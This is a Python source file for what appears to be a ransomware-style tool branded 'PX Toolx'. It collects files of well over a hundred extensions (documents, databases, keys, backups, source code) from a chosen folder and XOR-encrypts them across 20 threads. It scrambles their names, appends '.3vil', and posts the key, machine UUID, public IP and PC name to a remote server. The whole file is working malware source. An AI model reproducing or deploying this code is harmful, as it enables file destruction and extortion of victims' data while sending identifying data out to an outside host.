import time
import hashlib
import secrets
import string
from sys import exit
from threading import Thread
from queue import Queue
import os
from requests import get as rget, post as post
import subprocess
from tkinter import filedialog
from tkinter import *
import base64


def welcome():
    lines = ["",
             " _______   __    __        ________                      __           ",
             "|       \ |  \  |  \      |        \                    |  \          ",
             "| $$$$$$$\| $$  | $$       \$$$$$$$$  ______    ______  | $$ __    __ ",
             "| $$__/ $$ \$$\/  $$         | $$    /      \  /      \ | $$|  \  /  \\",
             "| $$    $$  >$$  $$          | $$   |  $$$$$$\|  $$$$$$\| $$ \$$\/  $$",
             "| $$$$$$$  /  $$$$\          | $$   | $$  | $$| $$  | $$| $$  >$$  $$ ",
             "| $$      |  $$ \$$\         | $$   | $$__/ $$| $$__/ $$| $$ /  $$$$\ ",
             "| $$      | $$  | $$         | $$    \$$    $$ \$$    $$| $$|  $$ \$$\\",
             " \$$       \$$   \$$          \$$     \$$$$$$   \$$$$$$  \$$ \$$   \$$",
             "                                                                      ",
             "                                             Helping you take control.",
             "                                                 www.pxtoolx.com      ",
             ""]
    for x in lines:
        print(x)
        time.sleep(0.1)


def error():
    lines = ["  ",
             " ",
             "                          ______                      ",
             "  _________        .---\"""      \"""---.               ",
             " :______.-':      :  .--------------.  :              ",
             " | ______  |      | :                : |              ",
             " |:______B:|      | |  Little Error: | |              ",
             " |:______B:|      | |                | |              ",
             " |:______B:|      | |  Contact       | |              ",
             " |         |      | |  Support.      | |              ",
             " |:_____:  |      | |                | |              ",
             " |    ==   |      | :                : |              ",
             " |       O |      :  '--------------'  :              ",
             " |       o |      :'---...______...---'               ",
             " |       o |-._.-i___/'             \._               ",
             " |'-.____o_|   '-.   '-...______...-'  `-._           ",
             " :_________:      `.____________________   `-.___.-.  ",
             "                  .'.eeeeeeeeeeeeeeeeee.'.      :___: ",
             "     fsc        .'.eeeeeeeeeeeeeeeeeeeeee.'.          ",
             "               :____________________________: ",
             "  ",
             " "]

    for x in lines:
        print(x)
        time.sleep(0.1)


def bye_bye():
    welcome()
    art = [" BYE BYE! ",
           " ",
           "  ",
           "   , ; ,   .-'\"\"\"'-.    , ; , ",
           "   \\\\|/  .'         '.  \|// ",
           "    \-;-/   ()   ()   \-;-/ ",
           "    // ;               ; \\\\ ",
           "   //__; :.         .; ;__\\\\ ",
           "  `-----\\'.'-.....-'.'/-----' ",
           "         '.'.-.-,_.'.' ",
           "           '(  (..-' ",
           "             '-' ",
           "  ",
           " "]
    for x in art:
        print(x)
        time.sleep(0.1)


def done(status):
    os.system("cls")
    print(f"PC {pc_name} {status}.")
    msgs = ['DDDDDDDDDDDDD             OOOOOOOOO     NNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEE',
            'D::::::::::::DDD        OO:::::::::OO   N:::::::N       N::::::NE::::::::::::::::::::E',
            'D:::::::::::::::DD    OO:::::::::::::OO N::::::::N      N::::::NE::::::::::::::::::::E',
            'DDD:::::DDDDD:::::D  O:::::::OOO:::::::ON:::::::::N     N::::::NEE::::::EEEEEEEEE::::E',
            '  D:::::D    D:::::D O::::::O   O::::::ON::::::::::N    N::::::N  E:::::E       EEEEEE',
            '  D:::::D     D:::::DO:::::O     O:::::ON:::::::::::N   N::::::N  E:::::E',
            '  D:::::D     D:::::DO:::::O     O:::::ON:::::::N::::N  N::::::N  E::::::EEEEEEEEEE',
            '  D:::::D     D:::::DO:::::O     O:::::ON::::::N N::::N N::::::N  E:::::::::::::::E',
            '  D:::::D     D:::::DO:::::O     O:::::ON::::::N  N::::N:::::::N  E:::::::::::::::E',
            '  D:::::D     D:::::DO:::::O     O:::::ON::::::N   N:::::::::::N  E::::::EEEEEEEEEE',
            '  D:::::D     D:::::DO:::::O     O:::::ON::::::N    N::::::::::N  E:::::E',
            '  D:::::D    D:::::D O::::::O   O::::::ON::::::N     N:::::::::N  E:::::E       EEEEEE',
            'DDD:::::DDDDD:::::D  O:::::::OOO:::::::ON::::::N      N::::::::NEE::::::EEEEEEEE:::::E',
            'D:::::::::::::::DD    OO:::::::::::::OO N::::::N       N:::::::NE::::::::::::::::::::E',
            'D::::::::::::DDD        OO:::::::::OO   N::::::N        N::::::NE::::::::::::::::::::E',
            'DDDDDDDDDDDDD             OOOOOOOOO     NNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEE',
            '']

    for msg in msgs:
        print(msg)
        time.sleep(0.15)


def keyboard_interrupt():
    os.system("cls")
    cont = input(f"are you sure you want to abort operation?\n:>> ")
    if str(cont).lower() in ["y", "yes"]:
        print("Okay.. stopping operation as requested")
        time.sleep(5)
        exit(1)
    else:
        print("Okay, process continues..")
        pass


# def keyboard_interrupt(func):
#     def wrapper(*args, **kwargs):
#         try:
#             return func(*args, **kwargs)
#         except KeyboardInterrupt:
#             exc_data()
#             # Execute some function here or perform some other action
#     return wrapper


encrypted_ext = ('.json',
                 '.jfif',
                 '.py',
                 '.shtml',
                 '.mmp',
                 '.dibs',
                 '.dib',
                 '.smr',
                 '.smp',
                 '.der',
                 '.pfx',
                 '.key',
                 '.crt',
                 '.csr',
                 '.p12',
                 '.pem',
                 '.odt',
                 '.ott',
                 '.sxw',
                 '.stw',
                 '.uot',
                 '.3ds',
                 '.max',
                 '.3dm',
                 '.ods',
                 '.ots',
                 '.sxc',
                 '.stc',
                 '.dif',
                 '.slk',
                 '.wb2',
                 '.odp',
                 '.otp',
                 '.sxd',
                 '.std',
                 '.uop',
                 '.odg',
                 '.otg',
                 '.sxm',
                 '.mml',
                 '.lay',
                 '.lay6',
                 '.asc',
                 '.sqlite3',
                 '.sqlitedb',
                 '.sql',
                 '.accdb',
                 '.mdb',
                 '.db',
                 '.dbf',
                 '.odb',
                 '.frm',
                 '.myd',
                 '.myi',
                 '.ibd',
                 '.mdf',
                 '.ldf',
                 '.sln',
                 '.suo',
                 '.cs',
                 '.c',
                 '.cpp',
                 '.pas',
                 '.h',
                 '.asm',
                 '.js',
                 '.cmd',
                 '.bat',
                 '.ps1',
                 '.vbs',
                 '.vb',
                 '.pl',
                 '.dip',
                 '.dch',
                 '.sch',
                 '.brd',
                 '.jsp',
                 '.php',
                 '.asp',
                 '.rb',
                 '.java',
                 '.jar',
                 '.class',
                 '.sh',
                 '.mp3',
                 '.wav',
                 '.swf',
                 '.fla',
                 '.wmv',
                 '.mpg',
                 '.vob',
                 '.mpeg',
                 '.asf',
                 '.avi',
                 '.mov',
                 '.mp4',
                 '.3gp',
                 '.mkv',
                 '.3g2',
                 '.flv',
                 '.wma',
                 '.mid',
                 '.m3u',
                 '.m4u',
                 '.djvu',
                 '.svg',
                 '.ai',
                 '.psd',
                 '.nef',
                 '.tiff',
                 '.tif',
                 '.cgm',
                 '.raw',
                 '.gif',
                 '.png',
                 '.bmp',
                 '.jpg',
                 '.jpeg',
                 '.vcd',
                 '.iso',
                 '.backup',
                 '.zip',
                 '.rar',
                 '.7z',
                 '.gz',
                 '.tgz',
                 '.tar',
                 '.bak',
                 '.tbk',
                 '.bz2',
                 '.PAQ',
                 '.ARC',
                 '.aes',
                 '.gpg',
                 '.vmx',
                 '.vmdk',
                 '.vdi',
                 '.sldm',
                 '.sldx',
                 '.sti',
                 '.sxi',
                 '.602',
                 '.hwp',
                 '.snt',
                 '.onetoc2',
                 '.dwg',
                 '.pdf',
                 '.wk1',
                 '.wks',
                 '.123',
                 '.rtf',
                 '.csv',
                 '.txt',
                 '.vsdx',
                 '.vsd',
                 '.edb',
                 '.eml',
                 '.msg',
                 '.ost',
                 '.pst',
                 '.potm',
                 '.potx',
                 '.ppam',
                 '.ppsx',
                 '.ppsm',
                 '.pps',
                 '.pot',
                 '.pptm',
                 '.pptx',
                 '.ppt',
                 '.xltm',
                 '.xltx',
                 '.xlc',
                 '.xlm',
                 '.xlt',
                 '.xlw',
                 '.xlsb',
                 '.xlsm',
                 '.xlsx',
                 '.xls',
                 '.dotx',
                 '.dotm',
                 '.dot',
                 '.docm',
                 '.docb',
                 '.docx',
                 '.doc',
                 '.xml',
                 '.log',
                 '.cfg',
                 '.conf',
                 '.ini',
                 '.plist',
                 '.tmp',
                 '.temp',
                 '.swp',
                 '.lock',
                 '.dll',
                 '.sys',
                 '.dat',
                 '.old',
                 '.bak1',
                 '.bak2',
                 '.config',
                 '.cache',
                 '.sav',
                 '.dup',
                 '.orig',
                 '.bkp',
                 '.bk',
                 '.bup',
                 '.bck',
                 '.temp',
                 )


def pause_clause(message):
    input(message)


def encode_file_name(file_name, key):
    key_len = len(key) - 1
    index = 0
    # Encrypt the file name using XOR encryption and base64 encoding
    encrypted_file_name_bytes = bytearray()

    for c in file_name:
        # Perform XOR between the Unicode code point of the character and the key character
        xor_result = ord(c) ^ ord(key[index])
        # Convert the XOR result to a 2-byte representation and append it to encrypted_file_name_bytes
        encrypted_file_name_bytes.extend(xor_result.to_bytes(1, byteorder='big', signed=False))
        # data = data + xor_result.to_bytes(1, 'little')
        if index >= key_len:
            index = 0
        else:
            index += 1
    return encrypted_file_name_bytes


def decode_file_name(encoded_file_name, key):
    key_len = len(key) - 1
    index = 0

    decrypted_file_name_bytes = bytearray()
    for byte in encoded_file_name:
        # Extract the XOR result from the byte
        xor_result = ord(byte)
        # Convert the key character to its Unicode code point
        key_code_point = ord(key[index])
        # Perform XOR between the XOR result and the key code point
        decoded_char = chr(xor_result ^ key_code_point)
        # Append the decoded character to the result string
        decrypted_file_name_bytes += decoded_char

        if index >= key_len:
            index = 0
        else:
            index += 1

    return decrypted_file_name_bytes


def rename_file(file_path, key, decrypt=False):
    # Separate the file path, file name, and extension
    file_dir, file_name = os.path.split(file_path)
    file_base, file_ext = os.path.splitext(file_name)

    # Remove ".3vil" from the file name if decrypt=True
    if decrypt and file_ext == '.3vil':
        file_base, file_ext = os.path.splitext(file_base)

    # Encode or decode the file name
    if decrypt:
        new_file_base = str(encode_file_name(base64.b64decode(file_base).decode('utf-8'), key), 'utf-8').strip(
            '\x00')
        new_file_base = base64.b64decode(new_file_base.encode('utf-8')).decode('utf-8')
    else:
        file_base = base64.b64encode(file_base.encode('utf-8')).decode('utf-8')
        new_file_base = base64.b64encode(encode_file_name(file_base, key)).decode('utf-8')

    # Construct the new file name
    new_file_name = f"{new_file_base}{file_ext}"

    # Construct the new file path
    if decrypt:
        new_file_path = os.path.join(file_dir, new_file_name)
    else:
        new_file_path = os.path.join(file_dir, f"{new_file_name}.3vil")

    # Rename the file
    os.rename(file_path, new_file_path)

    return new_file_path


def check():
    response = post(url, data=all_data)
    if response.status_code == 200:
        try:
            response_data = response.json()
        except KeyboardInterrupt:
            keyboard_interrupt()
        except Exception as et:
            print(et)
            time.sleep(30)
            exit(0)
        else:
            if response_data['status'] == 'success':
                os.system("cls")
                welcome()
                for root, dirs, files in os.walk(f'{sysUser}'):
                    for current_file in files:
                        file_path, file_ext = os.path.splitext(root + '\\' + current_file)
                        if file_ext.lower() in encrypted_ext:
                            file_paths.append(root + '\\' + current_file)
                            paths.add(root)
                            print(f"adding {root}/{current_file} to list")
                return True
            elif response_data['status'] == 'error' and response_data['msg'] == "already_exist":
                os.system("cls")
                error()
                print("Your PC encryption status is: Already Encrypted.\ncontact support if this is a false positive.")
                time.sleep(30)
                exit(0)
            elif response_data['status'] == 'error' and response_data['msg'] == "Invalid Key":
                error()
                print(f"decryption key: {keys} is invalid.\ncontact support if this is a false positive.")
                time.sleep(30)
                exit(0)
            else:
                error()
                print(f"Unrecognised error, contact support with Error note: '{response_data}'.")
                time.sleep(30)
                exit(0)
    else:
        error()
        print("Error confirming encryption status.\ncheck your internet service or contact support if problem persists")
        time.sleep(30)
        exit(0)

    return False


def encrypt(key, state):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = len(key) - 1
        try:
            with open(file, 'rb') as fp:
                data = fp.read()
            with open(file, 'wb') as fp:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    fp.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
                print(f'<< {file} {state} sucessfuly>>')
            if state == "Encrypted":
                rename_file(file, key)
            elif state == "Decrypted":
                rename_file(file, key, decrypt=True)
        except KeyboardInterrupt:
            keyboard_interrupt()
        except Exception as ep:
            print(f'Failed to encrypt {file}\n{ep}\n\nSkipping{file}')
            pass

        q.task_done()


if __name__ == '__main__':
    states = ""
    keys = ""
    function_used = ""
    action = ""
    url = "https://extractor.pxtoolx.com/gosecure.php"
    encryption_level = 2048 // 8
    pc_name = os.getenv('COMPUTERNAME')
    hostname = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    # sysUser = f"{os.environ['USERPROFILE']}/Desktop/Pxtoolx/"
    sysRoot = {os.path.expanduser('~')}
    # owner = 'prixzlex@163.com'
    paths = set()
    file_paths = []
    q = Queue()
    try:
        action = int(
            input(
                f"Which action would you like to perform?\n1. Encrypt {pc_name} files\n2. Decrypt {pc_name} files\n:>> "))
        pause_clause("Press the <ENTER> key to select folder\n")
        Tk().withdraw()
        sysUser = filedialog.askdirectory(title="Select Folder To Process All Files And Sub Directories")
        if action == 1:
            while True:
                owner = str(input(
                    "*IMPORTANT WARNING* Do not make a mistake on the email address as you might not have access to recover your files.\nEnter Valid Email Address :>> ")).lower()
                confirm_owner = str(input("Confirm Email Address :>> ")).lower()
                if confirm_owner == owner:
                    break
                else:
                    print("Email addresses do not match.")
                    continue
            states = "Encrypted"
            key3 = secrets.choice(string.ascii_letters)
            key2 = os.getenv('COMPUTERNAME') + key3
            key1 = key2.encode('utf-8')
            keys = hashlib.sha256(key1).hexdigest()

            publicIP = rget('https://api.ipify.org').text
            all_data = {
                "hostname": hostname,
                "function_name": "encData",
                "ip": publicIP,
                "key": keys,
                "owner": owner,
                "pcname": pc_name,
            }
        if action == 2:
            states = "Decrypted"
            encrypted_ext = (".3vil",)
            keys = str(input(f"TO DECRYPT YOUR FILES. \n{pc_name}\nEnter key to decrypt your files :>> "))
            all_data = {
                "function_name": "decData",
                "hostname": hostname,
                "key": keys,
            }
        if check():
            for all_file in file_paths:
                q.put(all_file)
            os.system("cls")
            welcome()
            for i in range(20):
                thread = Thread(target=encrypt, args=(keys, states,), daemon=True)
                thread.start()

            q.join()
            if action == 1:
                done("Encryption")
            elif action == 2:
                done("Decryption")
            else:
                done("action")
            time.sleep(30)
            exit(1)

    except KeyboardInterrupt:
        keyboard_interrupt()
    except Exception as ex:
        print(f"Error >>{ex}")
        time.sleep(30)
        exit(0)
